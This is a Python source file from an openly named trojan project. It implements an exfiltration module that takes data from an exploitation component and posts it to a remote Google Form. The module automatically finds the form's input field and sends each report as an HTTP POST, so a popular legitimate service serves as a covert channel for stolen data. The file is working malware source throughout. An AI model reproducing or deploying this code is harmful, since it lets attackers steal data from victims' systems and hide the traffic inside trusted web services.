#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import re
from urllib import request, parse

from src.modules import ExfiltrationModule


class GoogleForms(ExfiltrationModule):
    def __init__(self,
                 module, *,
                 form_url: str,
                 entry_id: [str, int] = None):
        """Exfiltrate data through Google Forms.

        :param module: Instance of ExploitationModule from which the
            exfiltrator receives data by attaching itself to as a
            subscriber.
        :param form_url: URL to the Google Form.
        :param entry_id: Optional ID for the field in a remote instance
            of Google Forms where the exfiltrated data will be written
            to. Set to None for automatic detection of the first field
            available in the form.
        """
        super().__init__(module)
        self.form_url = form_url
        self.entry_id = entry_id

    @property
    def form_url(self) -> str:
        """
        Gets the form URL.
        Sets the form URL by parsing the URL provided, stripping query
        strings/fragments and appending to it the /formResponse
        endpoint for HTTP POST requests.
        """
        return self._form_url

    @form_url.setter
    def form_url(self, url: str):
        url = parse.urlsplit(url)
        new_path = url.path.replace("viewform", "formResponse")
        self._form_url = f"{url.scheme}://{url.netloc}{new_path}"

    @property
    def entry_id(self) -> str:
        """
        Gets the entry ID.
        Sets the entry ID by fetching the form through a HTTP GET
        request and finding the first input field available.
        """
        return self._entry_id

    @entry_id.setter
    def entry_id(self, id_value: [str, int]):
        if id_value is None:
            form_html = self._fetch_form()
            id_value = re.search(r"\[{2}(?P<id>\d{9}),", form_html).group("id")
        self._entry_id = str(id_value)

    def update(self, message: [str, None]) -> None:
        """Send each report as a new answer to a remote instance of
        Google Forms."""
        if message is not None:
            self._send_message(message)

    def _fetch_form(self) -> str:
        """Fetch a form through an HTTP GET request."""
        with request.urlopen(url=self.form_url) as html:
            contents = html.read()
        return str(contents)

    def _send_message(self, message: str) -> None:
        """Send exfiltrated data to a remote instance of Google Forms
        through an HTTP POST request."""
        form_data = {
            f"entry.{self.entry_id}": message,
            "draftResponse": '[]',
            "pageHistory": 0,
        }
        request_body: bytes = parse.urlencode(form_data).encode()
        url = request.Request(url=self.form_url, data=request_body)
        request.urlopen(url)
